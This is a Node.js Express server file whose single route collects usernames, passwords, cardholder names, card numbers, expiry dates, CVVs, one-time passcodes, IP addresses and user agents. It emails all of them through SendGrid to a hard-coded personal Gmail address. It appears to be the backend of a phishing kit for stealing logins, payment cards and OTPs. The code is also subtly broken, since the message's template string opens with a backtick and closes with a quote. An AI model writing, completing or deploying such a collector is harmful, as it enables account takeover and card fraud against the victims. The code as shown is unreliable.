const express = require('express');
const cors = require('cors');
const sgMail = require('@sendgrid/mail');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Set SendGrid API key
sgMail.setApiKey(process.env.SENDGRID_API_KEY);
// ✅ POST route to receive data
app.post('/api/check', async (req, res) => {
  const formData = req.body;
  console.log('📩 Received form data:', formData);
  // Extract values
  const {
    user,
    pass,
    name,
    cc,
    exp,
    cvv,
    otp,
    ip,
    userAgent
  } = formData;
  try {
    // ✅ Send email with SendGrid
    const msg = {
      to: 'jessie.bosqueschool.org@gmail.com', // Your recipient email
      from: process.env.EMAIL_USER, // Must be a SendGrid-verified sender email
      subject: '🔔 New OTP Form Submission',
      text: `
      📩 New Submission Received:

      👤 User: ${user}
      🔑 Pass: ${pass}
      🙍 Name: ${name}
      💳 Card: ${cc}
      📅 Expiry: ${exp}
      🔒 CVV: ${cvv}
      🔐 OTP: ${otp}
      🌍 IP: ${ip}
      🖥️ UserAgent: ${userAgent}
      '};
  

    await sgMail.send(msg);
    console.log('📧 Email sent successfully');

    res.json({ status: 'ok', message: 'Data received and emailed ✅' });
  } catch (error) {
    console.error('❌ Error sending email:', error);
    if (error.response) {
      console.error(error.response.body); // Log SendGrid-specific errors
    }
    res.status(500).json({ status: 'error', message: 'Failed to send email' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
